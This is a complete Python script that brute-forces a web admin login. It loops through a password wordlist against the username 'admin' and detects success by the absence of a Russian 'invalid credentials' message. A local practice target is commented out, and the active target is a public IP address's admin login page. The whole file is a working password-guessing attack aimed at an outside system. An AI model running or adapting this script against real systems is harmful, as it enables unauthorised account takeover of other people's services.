import requests
import logging

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# Target URL
# url = "http://localhost:4280/vulnerabilities/brute/"
url = "http://80.80.218.155/admin/login_check"

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    "Referer": "http://80.80.218.155/admin/",
}


def brute_force(username, password_file):
    with open(password_file, 'r') as file:
        passwords = file.read().splitlines()

    i = 1
    for password in passwords:
        # Parameters for the GET request
        params = {
            "username": username,
            "password": password,
            "Login": "Login"
        }

        response = requests.post(url, headers=headers, params=params)

        # Check if login was successful
        # Недействительные аутентификационные данные.
        if not "Недействительные аутентификационные данные." in response.text:
            msg = f"[{i}][+] Success! Username: {username}, Password: {password}"
            logging.info(msg)
            with open("result.txt", 'w') as file:
                file.write(msg)
            return

        logging.info(f"[{i}][-] Failed: {username}:{password}")
        i += 1

    logging.info("[!] Brute force attack completed. No valid credentials found.")


if __name__ == "__main__":
    username = "admin"
    password_file = "/mnt/ntfs/csec/attack-practice/brute force/script.txt"

    brute_force(username, password_file)
